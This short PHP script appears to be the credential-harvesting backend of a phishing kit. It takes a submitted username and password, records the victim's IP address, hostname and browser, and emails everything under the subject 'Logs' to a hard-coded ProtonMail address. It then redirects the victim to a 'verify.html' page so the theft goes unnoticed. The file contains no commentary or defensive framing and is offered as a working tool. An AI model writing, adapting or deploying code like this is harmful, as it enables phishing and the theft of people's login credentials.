<?php
if($_POST["user"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| INFO |--------------|\n";
$message .= "|Username : ".$_POST['user']."\n";
$message .= "|Password : ".$_POST['pass']."\n";
$message .= "|--------------- -------------------|\n";
$message .= "|IP: ".$ip."\n";

$send = "crowntoys@protonmail.com";
$subject = "Logs | $ip";
{
mail("$send", "$subject", $message);   
}
  $praga=rand();
$praga=md5($praga);
  header ("Location: verify.html");
}else{
header ("Location: index.php");
}

?>